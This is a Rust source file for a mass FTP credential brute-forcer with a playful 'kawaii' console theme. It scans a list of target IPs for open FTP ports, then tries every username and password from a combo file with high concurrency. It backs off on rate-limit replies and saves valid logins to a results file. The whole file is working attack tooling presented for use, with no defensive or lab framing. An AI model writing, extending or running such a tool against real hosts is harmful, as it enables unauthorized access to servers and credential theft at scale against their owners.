use anyhow::{anyhow, Result};
use suppaftp::AsyncFtpStream;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::Path,
    sync::Arc,
};
use tokio::{sync::{Semaphore, Mutex}, time::{sleep, Duration}};
use tokio::time::timeout;
use futures::stream::{FuturesUnordered, StreamExt};
use futures::stream;

// === Config ===
const MAX_PORT_SCAN_CONCURRENCY: usize = 5; // ← New: limit parallel port scans
const PORTS: &[u16] = &[21, 990, 2121, 8021, 2221];
const TIMEOUT_SECS: u64 = 2;
const GLOBAL_CONCURRENCY: usize = 15;
const STOP_ON_SUCCESS: bool = true;
const SAVE_RESULTS: bool = true;
const OUTPUT_FILE: &str = "ftp_results.txt";

// hardcoded input files
const IP_LIST_FILE: &str = "ips.txt";
const USERPASS_FILE: &str = "combo.txt";

// === Colors for Ultimate Kawaii Experience ===
const PURPLE: &str = "\x1b[38;5;135m"; // Purple 💜
const ORANGE: &str = "\x1b[38;5;214m"; // Orange 🍊
const PINK: &str = "\x1b[38;5;213m";   // Pink 💖
const RESET: &str = "\x1b[0m";         // Reset

// === Helper Functions ===

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
       } else {
    format!("{}:{}", clean, port)
}
    }
}

async fn quick_ftp_check(addr: &str) -> Result<bool> {
    match timeout(Duration::from_secs(TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            let _ = ftp.quit().await;
            Ok(true)
        }
        Ok(Err(_)) | Err(_) => Ok(false),
    }
}



async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    Ok(true)
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        Ok(false)
                    } else if msg.contains("421") {
                        sleep(Duration::from_secs(1)).await;
                        Ok(false)
                    } else {
                        Err(anyhow!("FTP error: {}", msg))
                    }
                }
            }
        }
        Err(_) => Ok(false),
    }
}


// === Main Brute-force Function ===

pub async fn run(_target: &str) -> Result<()> {
   println!("{PURPLE}");
    println!("             (｡♥‿♥｡) Welcome oni-chan to Kawaii FTP Brute-forcer! (｡♥‿♥｡)");
    println!("   ／人◕ ‿‿ ◕人＼       Let's find those passwords, Senpai! UwU");
    println!("    ~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~");
    println!("{RESET}");

    println!("{PURPLE}~(>w<)~ Initiating super kawaii scanning sequence~ {RESET}");


let combos = load_lines(USERPASS_FILE)?;
let mut usernames_vec = Vec::new();
let mut passwords_vec = Vec::new();

for combo in combos {
    if let Some((user, pass)) = combo.split_once(':') {
        usernames_vec.push(user.to_string());
        passwords_vec.push(pass.to_string());
    }
}

let usernames = Arc::new(usernames_vec);
let passwords = Arc::new(passwords_vec);

    let found = Arc::new(Mutex::new(Vec::new()));
    let semaphore = Arc::new(Semaphore::new(GLOBAL_CONCURRENCY));

    let file = File::open(IP_LIST_FILE)?;
    let reader = BufReader::new(file);

 println!("{PURPLE}[*] Warming up, preparing sparkle magic... ✨ {RESET}");
println!("{ORANGE}[*] Starting scan of cute servers... nyaa~~ {RESET}");


    let mut all_tasks = FuturesUnordered::new();

    for line in reader.lines() {
        let ip = line?.trim().to_string();
        if ip.is_empty() {
            continue;
        }

let usernames = Arc::clone(&usernames);
let passwords = Arc::clone(&passwords);
let found = Arc::clone(&found);
let sem = Arc::clone(&semaphore);


        all_tasks.push(tokio::spawn(async move {
            let open_ports = {
                let mut scan_tasks = FuturesUnordered::new();
                let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));

                for &port in PORTS {
                    let ip = ip.clone();
                    let port_scan_sem = Arc::clone(&port_scan_sem);
                    scan_tasks.push(tokio::spawn(async move {
                        let _permit = port_scan_sem.acquire_owned().await.unwrap();
                        let addr = format_addr(&ip, port);
                        match quick_ftp_check(&addr).await {
                            Ok(true) => Some(port),
                            _ => None,
                        }
                    }));
                }

                let mut ports = Vec::new();
                while let Some(res) = scan_tasks.next().await {
                    if let Ok(Some(port)) = res {
                        ports.push(port);
                    }
                }
                ports
            };

            if open_ports.is_empty() {
                ("{ORANGE}[-] {}: No FTP ports open... how sad, Senpai (｡•́︿•̀｡){RESET}", ip);
                return;
            }

            println!("{PURPLE}[*] {}: Ports open and waiting for cuddles! {:?} 💜{RESET}", ip, open_ports);
            println!("\n{PINK}[+] Bruteforce time, go go gooo {RESET}");
           for port in open_ports {
    let addr = format_addr(&ip, port);
    println!("{PURPLE}[*] Brute-forcing {} nya~ (ง •̀_•́)ง {RESET}", addr);

                let successes = Arc::new(Mutex::new(Vec::new()));
                let stop_flag = Arc::new(Mutex::new(false));

let userpass_stream = stream::iter({
    let mut combos = Vec::new();
    for user in usernames.iter() {
        for pass in passwords.iter() {
            combos.push((user.clone(), pass.clone()));
        }
    }
    combos
})
.map(|(user, pass)| {  // <-- (user, pass) directly here!
    let addr = addr.clone();
    let successes = Arc::clone(&successes);
    let stop_flag = Arc::clone(&stop_flag);
    let sem = Arc::clone(&sem);

    async move {
        let _permit = sem.acquire_owned().await.unwrap();

        if STOP_ON_SUCCESS && *stop_flag.lock().await {
            return;
        }

                                 match try_ftp_login(&addr, &user, &pass).await {
            Ok(true) => {
                println!("{PINK}[+] Sugoiii! {} -> {}:{} ~ 💖{RESET}", addr, user, pass);
                successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                if STOP_ON_SUCCESS {
                    *stop_flag.lock().await = true;
                }
            }
            Ok(false) => {
                println!("{ORANGE}[-] No luck on {} -> {}:{} ... (´；ω；`) {RESET}", addr, user, pass);
            }
            Err(_) => {}
        }
    }
})
.buffer_unordered(GLOBAL_CONCURRENCY);
                userpass_stream.for_each(|_| async {}).await;

                let successes_vec = successes.lock().await;
                if successes_vec.is_empty() {
                    println!("{ORANGE}[!] {}: No valid credentials... bummerrr (つω`｡){RESET}", addr);
                } else {
                    println!("{PINK}[+] {}: Found {} valid login(s)! Senpai will be so proud! (๑˃̵ᴗ˂̵){RESET}", addr, successes_vec.len());
                    found.lock().await.extend(successes_vec.iter().cloned());
                }
            }
        }));
    }


        while let Some(res) = all_tasks.next().await {
        res?;
    }

        let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n{ORANGE}[-] No credentials found... Senpai will be disappointed... ಥ_ಥ{RESET}");
    } else {
        println!("\n{PINK}[+] Valid credentials found, yattaaa!!! (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧{RESET}");
        for (host, user, pass) in creds.iter() {
            println!("{PINK}    {} -> {}:{} {RESET}", host, user, pass);
        }
        if SAVE_RESULTS {
            let file_path = Path::new(OUTPUT_FILE);
            let mut file = File::create(file_path)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("{PINK}[+] Results saved to '{}', uwu~ {RESET}", file_path.display());
        }
    }

    Ok(())
}

// === Main entry point ===

#[tokio::main]
async fn main() -> Result<()> {
    run("").await
}
